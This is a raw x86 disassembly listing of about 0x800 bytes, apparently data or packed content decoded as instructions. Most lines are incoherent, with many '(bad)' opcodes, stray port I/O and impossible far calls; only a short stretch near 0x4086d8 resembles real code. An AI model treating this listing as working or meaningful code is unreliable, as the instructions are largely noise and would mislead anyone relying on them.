  408103:	sub    eax,0xd0a15fcc
  408108:	inc    eax
  408109:	or     ecx,DWORD PTR [ecx+0x64]
  40810c:	(bad)  
  40810d:	and    BYTE PTR [ebp+0x601bb6ef],dl
  408113:	pusha  
  408114:	adc    BYTE PTR [esi+0x33],al
  408117:	dec    esi
  408118:	lea    esi,[esi-0x151e5cc]
  40811e:	inc    edx
  40811f:	(bad)  
  408120:	and    eax,0x4d249e2b
  408125:	jmp    0x408174
  408127:	push   ds
  408128:	aas    
  408129:	or     ah,BYTE PTR [edx]
  40812b:	and    ecx,DWORD PTR [eax]
  40812d:	shr    BYTE PTR [esi],0x30
  408130:	aas    
  408131:	scas   eax,DWORD PTR es:[edi]
  408132:	test   al,0xe
  408134:	out    dx,al
  408135:	push   ecx
  408136:	clc    
  408137:	jmp    0x408100
  408139:	or     eax,0xf369c5a8
  40813e:	out    dx,eax
  40813f:	in     al,dx
  408140:	loop   0x4080f9
  408142:	mov    bl,0x42
  408144:	jo     0x40813e
  408146:	sar    dh,cl
  408148:	inc    esi
  408149:	or     BYTE PTR [esi-0x41],bl
  40814c:	(bad)  
  40814d:	cld    
  40814e:	test   eax,0x35078d84
  408153:	cmp    al,0x2f
  408155:	adc    cl,BYTE PTR [edx]
  408157:	xor    dh,BYTE PTR [ebx-0x4d]
  40815a:	jecxz  0x408140
  40815c:	jbe    0x4081c5
  40815e:	and    al,0xbc
  408160:	cmp    esp,DWORD PTR [ecx]
  408162:	clc    
  408163:	sbb    esp,DWORD PTR [edx-0x5949ca3f]
  408169:	loopne 0x4081b7
  40816b:	sub    al,0xdb
  40816d:	sbb    ebp,ebp
  40816f:	ds push esp
  408171:	ror    DWORD PTR [ebx],cl
  408173:	out    dx,eax
  408174:	pop    esi
  408175:	lds    ebp,FWORD PTR [esi+0x590797c2]
  40817b:	jnp    0x408112
  40817d:	jge    0x4081dd
  40817f:	fild   DWORD PTR [eax+0x3c209c67]
  408185:	(bad)  
  408186:	sub    al,0x9e
  408188:	adc    BYTE PTR [edi+0x7c5e7519],ch
  40818e:	in     eax,dx
  40818f:	adc    eax,eax
  408191:	loopne 0x4081e9
  408193:	xchg   ebx,eax
  408194:	adc    BYTE PTR [ebx],dl
  408196:	sub    ebx,DWORD PTR [ecx+0x61760ac0]
  40819c:	mov    eax,0xabf54889
  4081a1:	dec    esp
  4081a2:	sahf   
  4081a3:	xchg   ebx,eax
  4081a4:	sahf   
  4081a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a6:	int3   
  4081a7:	cmc    
  4081a8:	scas   al,BYTE PTR es:[edi]
  4081a9:	dec    edx
  4081aa:	adc    al,0x79
  4081ac:	inc    eax
  4081ad:	inc    eax
  4081ae:	ficomp WORD PTR [esi+edi*2-0x6fec256]
  4081b5:	rol    BYTE PTR [esi+0x45],0x2f
  4081b9:	cwde   
  4081ba:	shl    esi,0xbd
  4081bd:	xor    al,0x41
  4081bf:	shr    ah,cl
  4081c1:	sbb    al,0xf6
  4081c3:	mov    ebp,0x43eb65c
  4081c8:	xchg   BYTE PTR [ebx+0x6e],bl
  4081cb:	cs dec ebx
  4081cd:	add    edx,ebp
  4081cf:	in     al,0xa0
  4081d1:	js     0x408180
  4081d3:	ds sti 
  4081d5:	adc    al,0x9c
  4081d7:	pop    eax
  4081d8:	sbb    cl,dh
  4081da:	rcl    BYTE PTR [esi-0x5a],1
  4081dd:	adc    cl,bh
  4081df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e0:	jl     0x408188
  4081e2:	add    BYTE PTR [ebp+0x35825f92],0x43
  4081e9:	jge    0x408215
  4081eb:	test   eax,0xaeebac30
  4081f0:	out    dx,al
  4081f1:	xchg   ebx,eax
  4081f2:	jp     0x408213
  4081f4:	dec    eax
  4081f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f6:	xchg   cl,bh
  4081f8:	mov    DWORD PTR [ecx-0x12],0x95e57feb
  4081ff:	shr    DWORD PTR [ebp+0x7d],0x2d
  408203:	mov    eax,ds:0x20a2679b
  408208:	cmp    ah,BYTE PTR [ebp+0x69]
  40820b:	add    cl,ah
  40820d:	out    dx,eax
  40820e:	out    dx,eax
  40820f:	fdivr  DWORD PTR [edx+ecx*8]
  408212:	test   DWORD PTR [esi+eax*8-0xb],esp
  408216:	add    DWORD PTR fs:[ebp+0x8931b70],0xca5f1a10
  408221:	jbe    0x4081ca
  408223:	sub    al,dl
  408225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408226:	xchg   edx,eax
  408227:	rol    BYTE PTR [ebx-0x5361a989],1
  40822d:	in     al,dx
  40822e:	fidiv  WORD PTR [ebp+0x412be2d8]
  408234:	jo     0x4081e3
  408236:	mov    eax,ds:0xb1b4d2ec
  40823b:	add    eax,0x1415f333
  408240:	xchg   DWORD PTR ds:0xebb52705,edi
  408246:	mov    ch,0x23
  408248:	mov    esi,0x287e4c13
  40824d:	jo     0x408210
  40824f:	cdq    
  408250:	data16 sahf 
  408252:	fild   WORD PTR [ecx+0xbef2fa4]
  408258:	jge    0x408203
  40825a:	mov    ah,BYTE PTR [edx-0x7d]
  40825d:	sub    ah,ah
  40825f:	xlat   BYTE PTR ds:[ebx]
  408260:	mov    al,ds:0x91221122
  408265:	daa    
  408266:	popa   
  408267:	adc    BYTE PTR [edx],0xfe
  40826a:	jmp    0x4fe810e4
  40826f:	mov    esi,0x7df5425
  408274:	mov    cl,0x98
  408276:	(bad)  
  408278:	cmp    DWORD PTR [ecx+0x281630c9],esi
  40827e:	loop   0x408287
  408280:	inc    eax
  408281:	repnz push eax
  408283:	aas    
  408284:	je     0x408234
  408286:	in     eax,0xef
  408288:	dec    esi
  408289:	shl    BYTE PTR [edi+edx*8],1
  40828c:	xor    al,0xd5
  40828e:	mov    edx,0x7f15bb37
  408293:	call   0x8393cb95
  408298:	jle    0x408242
  40829a:	imul   edi,edi,0x25
  40829d:	test   DWORD PTR [esi+eiz*4-0x31],ecx
  4082a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082a2:	add    eax,0x6ea7c497
  4082a7:	and    ah,BYTE PTR [ebx+0x15]
  4082aa:	in     eax,0xf4
  4082ac:	stc    
  4082ad:	in     al,0xca
  4082af:	(bad)  
  4082b0:	and    DWORD PTR [edi],esi
  4082b2:	repz mov dh,BYTE PTR [eax-0x60651eb4]
  4082b9:	dec    eax
  4082ba:	cwde   
  4082bb:	aas    
  4082bc:	jbe    0x40832a
  4082be:	out    0xc7,al
  4082c0:	dec    esi
  4082c1:	push   ss
  4082c2:	adc    DWORD PTR [edx+ecx*2-0x70],esp
  4082c6:	ret    0x683b
  4082c9:	cmp    edi,DWORD PTR [edi+0x73]
  4082cc:	mov    ds:0xf663d17e,eax
  4082d1:	in     al,dx
  4082d2:	(bad)  
  4082d3:	xchg   edi,eax
  4082d4:	xchg   DWORD PTR [eax+0x1d],ecx
  4082d7:	sbb    esp,DWORD PTR [ebp-0x2ece05b]
  4082dd:	cmp    dl,0x69
  4082e0:	dec    edx
  4082e1:	sbb    DWORD PTR [eax-0x4a933a7],0xffffffae
  4082e8:	ror    BYTE PTR [esi+0x9122dcb],1
  4082ee:	cs hlt 
  4082f0:	jle    0x408297
  4082f2:	(bad)  
  4082f3:	cmp    dh,ch
  4082f5:	adc    ah,BYTE PTR [ebx+0x549c355d]
  4082fb:	shl    DWORD PTR [edi],1
  4082fd:	mov    ebp,0xfef92e22
  408302:	cdq    
  408303:	iret   
  408304:	mov    edi,0x12164aa
  408309:	push   es
  40830a:	sbb    DWORD PTR [edx+0x11561c3b],ebx
  408310:	(bad)
  408314:	sahf   
  408315:	mov    al,ds:0xf9925dd1
  40831a:	inc    edi
  40831b:	jno    0x4082f5
  40831d:	add    eax,0x2cd66786
  408322:	pop    ecx
  408323:	popa   
  408324:	mov    dh,0x90
  408326:	ret    0xfcd8
  408329:	loopne 0x40839e
  40832b:	dec    esp
  40832c:	cli    
  40832d:	shr    BYTE PTR [edi+ebx*2],0x7d
  408331:	ss jo  0x4082db
  408334:	xchg   DWORD PTR [esi],esi
  408336:	or     DWORD PTR [esi+0x59106595],0xc4564492
  408340:	mov    WORD PTR [eax],?
  408342:	(bad)  
  408343:	pop    ss
  408344:	pop    ebp
  408345:	mov    edx,0x998d5dd3
  40834a:	aam    0x78
  40834c:	in     al,0x2a
  40834e:	xor    esi,DWORD PTR [ecx+ebx*4]
  408351:	or     al,0x71
  408353:	cmp    DWORD PTR [edx],ebp
  408355:	pop    ebx
  408356:	sub    eax,0xf1d8369f
  40835b:	sub    al,0x9
  40835d:	dec    ebx
  40835e:	aas    
  40835f:	es (bad) 
  408361:	sub    edx,DWORD PTR [esi]
  408363:	jmp    0x408342
  408365:	mov    WORD PTR [ebp+0x37],ss
  408368:	gs xchg esp,eax
  40836a:	xchg   DWORD PTR [edi-0x73],ecx
  40836d:	stos   BYTE PTR es:[edi],al
  40836e:	mov    eax,ds:0x5d29bf71
  408373:	(bad)  
  408374:	ffreep st(4)
  408376:	adc    al,0xc6
  408378:	xor    ebx,DWORD PTR [eax+0x3029ed13]
  40837e:	mov    ?,WORD PTR [eax+eax*1]
  408381:	push   cs
  408382:	sbb    ch,bh
  408384:	sub    BYTE PTR [ebx+0x231e668e],dl
  40838a:	mov    al,ds:0x373c73ae
  40838f:	imul   eax,DWORD PTR [eax+0x3a],0x9c19d4c
  408396:	pop    ebx
  408397:	or     esi,0xffffffff
  40839a:	or     eax,0xb46d0ff7
  40839f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4083a1:	inc    ecx
  4083a2:	or     edx,DWORD PTR [ebp+0x53]
  4083a5:	popa   
  4083a6:	and    dh,BYTE PTR [ebp+ecx*8+0x35]
  4083aa:	popa   
  4083ab:	aaa    
  4083ac:	into   
  4083ad:	ror    dh,1
  4083af:	rcr    BYTE PTR [edx+0x73],1
  4083b2:	(bad)  
  4083b3:	mov    al,ds:0x8bcb959b
  4083b8:	rol    bl,cl
  4083ba:	fs inc eax
  4083bc:	pop    ds
  4083bd:	(bad)  
  4083be:	pop    ebx
  4083bf:	xchg   ebx,eax
  4083c0:	(bad)  
  4083c2:	cwde   
  4083c3:	push   ebp
  4083c4:	call   0x734548d4
  4083c9:	fwait
  4083ca:	stc    
  4083cb:	dec    esi
  4083cc:	sub    dh,ch
  4083ce:	loopne 0x408375
  4083d0:	fsubr  DWORD PTR [ebx+0x48]
  4083d3:	stos   DWORD PTR es:[edi],eax
  4083d4:	add    eax,eax
  4083d6:	in     eax,0x41
  4083d8:	fsub   DWORD PTR [esi+0x2d]
  4083db:	(bad)  
  4083dc:	xchg   edx,eax
  4083dd:	push   edi
  4083de:	outs   dx,BYTE PTR ds:[esi]
  4083df:	call   0xfcdc:0x2a2852cf
  4083e6:	inc    ebx
  4083e7:	sub    BYTE PTR [ebx],cl
  4083e9:	daa    
  4083ea:	add    cl,BYTE PTR [esp+edx*4]
  4083ed:	in     eax,dx
  4083ee:	mov    cl,0x10
  4083f0:	jecxz  0x40842f
  4083f2:	out    dx,eax
  4083f3:	xlat   BYTE PTR ds:[ebx]
  4083f4:	or     edi,DWORD PTR [esi-0x1c]
  4083f7:	fstp   QWORD PTR [edi+0x53]
  4083fa:	dec    si
  4083fc:	push   es
  4083fd:	mov    dl,0xd6
  4083ff:	push   cs
  408400:	inc    DWORD PTR [ebx+0x22]
  408403:	les    eax,FWORD PTR [ecx]
  408405:	clc    
  408406:	mov    BYTE PTR ds:0xdbd41d45,dl
  40840c:	mov    db2,esi
  40840f:	sub    al,0x8a
  408412:	aaa    
  408413:	fucomi st,st(2)
  408415:	add    bh,cl
  408417:	xchg   esp,eax
  408418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408419:	call   0x1b95:0xfe21c881
  408420:	xor    al,0xc6
  408422:	xchg   ebx,eax
  408423:	test   DWORD PTR [esp+ebx*2],0x7d42e5c0
  40842a:	sahf   
  40842b:	test   DWORD PTR ds:0x4be83982,0xb839451b
  408435:	bound  ebx,QWORD PTR [ecx+0x68065d84]
  40843b:	nop
  40843c:	sub    eax,0x2e740504
  408441:	rol    edi,0x36
  408444:	mov    bl,0xa9
  408446:	pop    DWORD PTR [edx+0x345d2154]
  40844c:	adc    BYTE PTR [ecx+0x6d40b48f],bl
  408452:	adc    cl,BYTE PTR [edi+ecx*2-0x75906cda]
  408459:	sbb    edi,esi
  40845b:	lods   eax,DWORD PTR ds:[esi]
  40845c:	jns    0x408495
  40845e:	mov    al,ds:0x935ebf90
  408463:	mov    al,0x52
  408465:	xor    BYTE PTR [ebx+0x53],cl
  408468:	into   
  408469:	add    al,0x80
  40846b:	push   ds
  40846c:	shl    BYTE PTR [ebx+0x74],cl
  40846f:	push   ecx
  408470:	push   esi
  408471:	(bad)  
  408472:	int    0x2
  408474:	push   esi
  408475:	aad    0x7e
  408477:	jo     0x408443
  408479:	ds stos BYTE PTR es:[edi],al
  40847b:	fwait
  40847c:	inc    edx
  40847d:	or     dh,BYTE PTR [ebx+0x2d]
  408480:	stos   DWORD PTR es:[edi],eax
  408481:	dec    ebp
  408482:	int    0x29
  408484:	xchg   esp,eax
  408485:	dec    eax
  408486:	in     al,dx
  408487:	mov    es,WORD PTR [edi+esi*1+0x5340bd28]
  40848e:	mov    al,0x1d
  408490:	rol    BYTE PTR cs:[edi],0x52
  408494:	mov    ebx,0x8b8b7386
  408499:	push   ds
  40849a:	retf   0x4d2e
  40849d:	adc    eax,0xd1d63672
  4084a2:	push   0xc393d4d1
  4084a7:	fsubr  DWORD PTR [esi+0x52]
  4084aa:	cmp    ebx,esi
  4084ac:	bound  edx,QWORD PTR [edi+0x1a9a4047]
  4084b2:	fisttp QWORD PTR ds:0x5606f9
  4084b8:	iret   
  4084b9:	or     ebp,DWORD PTR [edx+0x13]
  4084bc:	xchg   edx,eax
  4084bd:	mov    DWORD PTR [esi+0x1ad901ac],esi
  4084c3:	xor    BYTE PTR [eax-0xc],ch
  4084c6:	fninit 
  4084c8:	outs   dx,DWORD PTR ds:[esi]
  4084c9:	hlt    
  4084ca:	adc    al,0x73
  4084cc:	lds    ecx,FWORD PTR [edi]
  4084ce:	inc    ebp
  4084cf:	cmc    
  4084d0:	xchg   ecx,eax
  4084d1:	dec    ebx
  4084d2:	push   ebp
  4084d3:	xacquire xchg DWORD PTR [eax+edi*8+0x45ebfbf8],eax
  4084db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084dc:	bound  esp,QWORD PTR [esi]
  4084de:	pusha  
  4084df:	call   0x9949d895
  4084e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084e5:	ins    DWORD PTR es:[edi],dx
  4084e6:	and    esi,DWORD PTR [edi+0x2f]
  4084e9:	mov    ch,0x65
  4084eb:	lds    ebx,FWORD PTR [edi-0x10]
  4084ee:	retf   
  4084ef:	mov    ds:0x4a1c6539,eax
  4084f4:	nop
  4084f5:	xor    eax,0xee317211
  4084fa:	gs test eax,0x302e3b2
  408500:	mov    ch,0x1c
  408502:	sub    al,0xcc
  408504:	push   ebp
  408505:	test   eax,0xa3b8af80
  40850a:	pop    esi
  40850b:	loop   0x4084fb
  40850d:	fwait
  40850e:	shl    DWORD PTR ds:0xd65d1b27,0x55
  408515:	mov    edx,0xa46ca8db
  40851a:	cmp    ebp,DWORD PTR [ebx-0x64d9b62c]
  408520:	and    al,dh
  408522:	(bad)  
  408523:	cwde   
  408524:	retf   
  408525:	add    BYTE PTR cs:[ebp+0x3a],dh
  408529:	lods   eax,DWORD PTR ds:[esi]
  40852a:	pop    edi
  40852b:	icebp  
  40852c:	jb     0x4084bd
  40852e:	adc    dh,BYTE PTR [edx-0x301432bf]
  408534:	mov    edi,edx
  408536:	(bad)  
  408537:	cmp    eax,0xe581c3ab
  40853c:	loopne 0x408589
  40853e:	push   es
  40853f:	inc    esi
  408540:	or     BYTE PTR [edx-0x15],0x93
  408544:	push   0xffffff87
  408546:	frstor [eax+0x5]
  408549:	jmp    0xa85acc05
  40854e:	arpl   WORD PTR [esi],bp
  408550:	sbb    ebx,DWORD PTR [ecx+0x31]
  408553:	adc    DWORD PTR [ebx+0x50],ecx
  408556:	add    al,0x46
  408558:	mov    edx,DWORD PTR [eax+0x57d30550]
  40855e:	aam    0x34
  408560:	leave  
  408561:	icebp  
  408562:	pop    esp
  408563:	or     al,0xe2
  408565:	mov    BYTE PTR ds:0x335565ac,al
  40856b:	add    ah,BYTE PTR [esi+esi*2+0x20]
  40856f:	cmp    eax,DWORD PTR [eax]
  408571:	jp     0x40858c
  408573:	add    al,0x6d
  408575:	mov    WORD PTR [eax+0x2f],ss
  408578:	mov    dl,0x9d
  40857a:	xor    ecx,ebx
  40857c:	xor    al,0x1f
  40857e:	jns    0x408505
  408580:	aas    
  408581:	inc    esp
  408582:	ret    0xd4f5
  408585:	push   esp
  408586:	push   edi
  408587:	xor    eax,0xbd1e95b1
  40858c:	call   0x6e87:0xa73de962
  408593:	pop    es
  408594:	mov    al,ds:0x5cce4f26
  408599:	mov    DWORD PTR [ecx-0x294a4bd3],edi
  40859f:	push   edx
  4085a0:	pop    ebp
  4085a1:	gs cmp al,0xb6
  4085a4:	push   0x158e04a0
  4085a9:	add    DWORD PTR [ecx],edx
  4085ab:	mov    edi,es
  4085ad:	adc    eax,0x8993ba13
  4085b2:	inc    ebp
  4085b3:	sbb    ah,BYTE PTR [eax]
  4085b5:	or     BYTE PTR [edi+esi*2+0x624aae5e],ah
  4085bc:	jle    0x408558
  4085be:	jno    0x4085ac
  4085c0:	mov    eax,?
  4085c2:	ins    DWORD PTR es:[edi],dx
  4085c3:	fdiv   DWORD PTR ds:0x871ae898
  4085c9:	dec    eax
  4085ca:	add    ecx,ecx
  4085cc:	fs loope 0x4085d8
  4085cf:	cmp    eax,0x55a60a0c
  4085d4:	mov    al,ds:0xc29179b8
  4085d9:	push   cs
  4085da:	or     BYTE PTR [ecx-0x1fa22c17],bl
  4085e0:	fmul   st(0),st
  4085e2:	add    al,0xac
  4085e4:	stc    
  4085e5:	shl    ah,1
  4085e7:	out    dx,al
  4085e8:	gs dec ebp
  4085ea:	sub    esi,DWORD PTR [ebx]
  4085ec:	inc    ebp
  4085ed:	push   0x68
  4085ef:	aam    0x42
  4085f1:	cwde   
  4085f2:	ret    0xf792
  4085f5:	sbb    esp,DWORD PTR [esi+0x70375bce]
  4085fb:	ret    0x5d32
  4085fe:	pop    ds
  4085ff:	loopne 0x40859e
  408601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408602:	sub    al,dl
  408604:	test   DWORD PTR [ecx],ebp
  408606:	inc    ecx
  408607:	push   esp
  408608:	mov    ebx,DWORD PTR [esi]
  40860a:	stos   BYTE PTR es:[edi],al
  40860b:	mov    esi,0x75f962da
  408610:	mov    cl,ah
  408612:	mov    ebp,0x463c9619
  408617:	push   0xffffffb3
  408619:	jne    0x408654
  40861b:	les    esp,FWORD PTR [ebx+0x4b173956]
  408621:	lds    ebx,FWORD PTR [ebx]
  408623:	cwde   
  408624:	lock push es
  408626:	cmp    al,bh
  408628:	mov    al,ds:0x7536b0ee
  40862d:	test   BYTE PTR [esi+0x1a6830c6],dl
  408633:	ror    DWORD PTR [ebx+eiz*8-0x1ef75486],cl
  40863a:	loopne 0x40865a
  40863c:	push   edx
  40863d:	sub    DWORD PTR [ebx],ecx
  40863f:	repnz in al,dx
  408641:	lahf   
  408642:	xor    DWORD PTR [edx],ebx
  408644:	mov    WORD PTR ss:[eax-0x28],gs
  408648:	std    
  408649:	shr    DWORD PTR [edi],1
  40864b:	push   esi
  40864c:	dec    edi
  40864d:	scas   al,BYTE PTR es:[edi]
  40864e:	shl    BYTE PTR [edx+0x5e],0x81
  408652:	mov    DWORD PTR [edx+eax*4],esp
  408655:	and    DWORD PTR [edx],eax
  408657:	xchg   edi,eax
  408658:	mov    bh,0xad
  40865a:	jg     0x40869b
  40865c:	(bad)  
  40865d:	in     al,dx
  40865e:	xor    DWORD PTR [eax],ebx
  408660:	mov    ch,0x4e
  408662:	test   BYTE PTR [edi-0x4cb2f08e],ch
  408668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408669:	jecxz  0x40865c
  40866b:	push   ebp
  40866c:	cmc    
  40866d:	push   eax
  40866e:	outs   dx,BYTE PTR ds:[esi]
  40866f:	repnz pop edi
  408671:	leave  
  408672:	mov    WORD PTR [eax-0xe076de2],es
  408678:	adc    BYTE PTR [ecx+ebx*1],al
  40867b:	jnp    0x4086c7
  40867d:	loopne 0x408649
  40867f:	loope  0x408605
  408681:	xor    al,0x60
  408683:	clc    
  408684:	cli    
  408685:	mov    ebp,0x304bb5a1
  40868a:	bound  edi,QWORD PTR [eax]
  40868c:	mov    esi,0x67dbc4
  408691:	sub    BYTE PTR [esi+0x639545e2],ch
  408697:	imul   esi,DWORD PTR [ebx+0xa],0x36fcbf43
  40869e:	mov    ch,0xc8
  4086a0:	pop    ebp
  4086a1:	jnp    0x408707
  4086a3:	vpcomw xmm4,xmm0,XMMWORD PTR ds:0x83e6c37e,0x92
  4086ad:	test   eax,0xd0d3bb79
  4086b2:	lds    edi,FWORD PTR [ebp-0x5a5d1dd3]
  4086b8:	loope  0x408693
  4086ba:	aaa    
  4086bb:	fst    DWORD PTR [esi+0x351a45f0]
  4086c1:	stos   BYTE PTR es:[edi],al
  4086c2:	in     al,dx
  4086c3:	aaa    
  4086c4:	dec    bp
  4086c6:	push   0x3a
  4086c8:	jb     0x40865c
  4086ca:	aas    
  4086cb:	daa    
  4086cc:	jle    0x40872d
  4086ce:	xor    al,0x99
  4086d0:	mov    ah,0xc4
  4086d2:	lds    esp,FWORD PTR [edi+esi*1-0x4e]
  4086d6:	repnz inc edx
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xc1a1ccdf
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  ebp,QWORD PTR [ebp-0x3c1aa5f1]
  408723:	sahf   
  408724:	cmp    ebp,DWORD PTR [ebp+0x35]
  408727:	out    0x5b,al
  408729:	sub    BYTE PTR [ebp-0x3c37fc24],dl
  40872f:	push   ebp
  408730:	int    0xfb
  408732:	rcr    DWORD PTR [edx],0xb2
  408735:	std    
  408736:	fwait
  408737:	adc    eax,0x17173662
  40873c:	das    
  40873d:	jb     0x4086fe
  40873f:	push   edx
  408740:	xchg   esi,eax
  408741:	adc    DWORD PTR [ecx+edx*8],esp
  408744:	(bad)  
  408745:	aad    0x48
  408747:	pop    ds
  408748:	idiv   al
  40874a:	push   ecx
  40874b:	and    DWORD PTR [ebx],esp
  40874d:	leave  
  40874e:	and    bl,al
  408750:	sub    eax,ebx
  408752:	xchg   edx,eax
  408753:	(bad)  
  408755:	mov    cl,0xf6
  408757:	fiadd  WORD PTR [esi+0x5a]
  40875a:	sbb    eax,DWORD PTR [edi-0x78]
  40875d:	pop    ebp
  40875e:	jge    0x40875f
  408760:	push   ebp
  408761:	jle    0x408772
  408763:	in     al,dx
  408764:	ror    BYTE PTR [edx+0x9b1431],1
  40876a:	clc    
  40876b:	jmp    DWORD PTR [eax]
  40876d:	test   ch,bl
  40876f:	cdq    
  408770:	add    al,0xb
  408772:	add    DWORD PTR [esi+ecx*1-0x18e15235],0x6eebb748
  40877d:	cmp    eax,0xee662514
  408782:	sbb    DWORD PTR [edx+0x22e446ac],ecx
  408788:	lahf   
  408789:	push   es
  40878a:	adc    ah,BYTE PTR [eax+0x4d]
  40878d:	neg    DWORD PTR [ebx-0x1d]
  408790:	and    bh,cl
  408792:	jmp    0xd9808a26
  408797:	ja     0x4087fb
  408799:	push   ebx
  40879a:	or     BYTE PTR [ebx],dl
  40879c:	das    
  40879d:	repnz int3 
  40879f:	add    bl,cl
  4087a1:	fisub  DWORD PTR [edi+0x6e]
  4087a4:	push   eax
  4087a5:	fdiv   DWORD PTR ds:0xa71a9fc9
  4087ab:	test   eax,0xd38d9655
  4087b0:	cld    
  4087b1:	cmp    DWORD PTR [edx+eax*1-0xe],0xffffffd6
  4087b6:	sti    
  4087b7:	hlt    
  4087b8:	xor    ebx,esi
  4087ba:	and    al,0x75
  4087bc:	pop    edx
  4087bd:	loopne 0x408770
  4087bf:	mov    dh,0x95
  4087c1:	jmp    0xd19a:0x488bb30d
  4087c8:	ror    BYTE PTR [esi],0x21
  4087cb:	dec    BYTE PTR [esi]
  4087cd:	ins    DWORD PTR es:[edi],dx
  4087ce:	jno    0x408803
  4087d0:	cmc    
  4087d1:	xchg   ebx,eax
  4087d2:	or     BYTE PTR [ecx],bh
  4087d4:	lds    ebx,FWORD PTR [eax+0x7c617045]
  4087da:	jae    0x408794
  4087dc:	mov    ds:0xb334c48d,al
  4087e1:	push   es
  4087e2:	mov    bh,0xeb
  4087e4:	imul   BYTE PTR [esi]
  4087e6:	cmp    DWORD PTR cs:[edx],eax
  4087e9:	hlt    
  4087ea:	xor    edx,ebp
  4087ec:	jbe    0x4087cd
  4087ee:	dec    esp
  4087ef:	stc    
  4087f0:	rcl    ecx,0x1d
  4087f3:	repz jb 0x408830
  4087f6:	mov    ds:0xed4078d3,al
  4087fb:	sbb    eax,0x8f636a6b
  408800:	mov    dh,0x83
  408802:	mov    esp,0xa1c15523
  408807:	dec    esp
  408808:	fdivr  QWORD PTR [esi]
  40880a:	popf   
  40880b:	and    al,0x52
  40880d:	or     DWORD PTR [edx],ecx
  40880f:	pop    ebx
  408810:	sub    DWORD PTR [edx-0x5055214],0xb0815e49
  40881a:	outs   dx,BYTE PTR ds:[esi]
  40881b:	jo     0x408871
  40881d:	mov    ebx,0xe1b9addf
  408822:	ins    DWORD PTR es:[edi],dx
  408823:	ss push ds
  408825:	xchg   esp,eax
  408826:	repnz sub ch,BYTE PTR [edx+0x590be830]
  40882d:	push   ds
  40882e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40882f:	(bad)  
  408830:	dec    edx
  408831:	(bad)  
  408833:	out    0x1,al
  408835:	cli    
  408836:	xchg   ecx,eax
  408837:	mov    cs,WORD PTR [edi-0x3a]
  40883a:	je     0x4088a3
  40883c:	xor    ebp,DWORD PTR [ebx*2-0x4c09657a]
  408843:	sbb    BYTE PTR [ecx+0x29],cl
  408846:	test   BYTE PTR [eax-0x2f50068f],ah
  40884c:	sub    eax,0xd4891b2e
  408851:	pop    ebx
  408852:	in     eax,0x69
  408854:	fild   QWORD PTR [edx+0x256d47f3]
  40885a:	xchg   ebp,eax
  40885b:	xchg   ecx,eax
  40885c:	push   es
  40885d:	adc    ecx,DWORD PTR [ebp+0x57]
  408860:	sub    bl,BYTE PTR [edx]
  408862:	into   
  408863:	scas   al,BYTE PTR es:[edi]
  408864:	jl     0x408814
  408866:	sbb    dl,BYTE PTR [ecx-0x47]
  408869:	aad    0x1e
  40886b:	and    edi,DWORD PTR [eax]
  40886d:	fsubr  QWORD PTR [edx+0x29f5c5f]
  408873:	leave  
  408874:	inc    eax
  408875:	inc    edi
  408876:	es daa 
  408878:	inc    edi
  408879:	and    eax,edi
  40887b:	stos   DWORD PTR es:[edi],eax
  40887c:	jae    0x4088a8
  40887e:	pop    edi
  40887f:	jecxz  0x4088a7
  408881:	mov    eax,0x5da86935
  408886:	cmp    esi,ecx
  408888:	xor    ecx,edi
  40888a:	jg     0x4088ab
  40888c:	inc    eax
  40888d:	in     al,0xdf
  40888f:	imul   ebx,DWORD PTR [edx],0x6f
  408892:	clc    
  408893:	rol    DWORD PTR [esi-0x51],0x0
  408897:	cwde   
  408898:	lea    ecx,[ebp+0x6a]
  40889b:	call   0x83ae:0x797730f7
  4088a2:	or     al,0xfe
  4088a4:	cdq    
  4088a5:	cmp    al,0x77
  4088a7:	scas   al,BYTE PTR es:[edi]
  4088a8:	fsubr  DWORD PTR [ebp-0x1d79c4d2]
  4088ae:	mov    dh,0xb9
  4088b0:	fsub   QWORD PTR [ebp+edi*2-0x7ebc230]
  4088b7:	mov    ecx,0x2f752afb
  4088bc:	or     esi,ebx
  4088be:	scas   eax,DWORD PTR es:[edi]
  4088bf:	pusha  
  4088c0:	arpl   WORD PTR [ecx],di
  4088c2:	mov    ebp,0x2ca3609d
  4088c7:	adc    cl,cl
  4088c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088ca:	cld    
  4088cb:	out    dx,al
  4088cc:	cld    
  4088cd:	inc    ebx
  4088ce:	fist   WORD PTR gs:[edx+0x56]
  4088d3:	cmc    
  4088d4:	aad    0x3e
  4088d6:	cmc    
  4088d7:	or     al,0x2
  4088d9:	jle    0x408910
  4088db:	dec    edi
  4088dc:	jae    0x408867
  4088de:	(bad)  
  4088e0:	cdq    
  4088e1:	pop    ebx
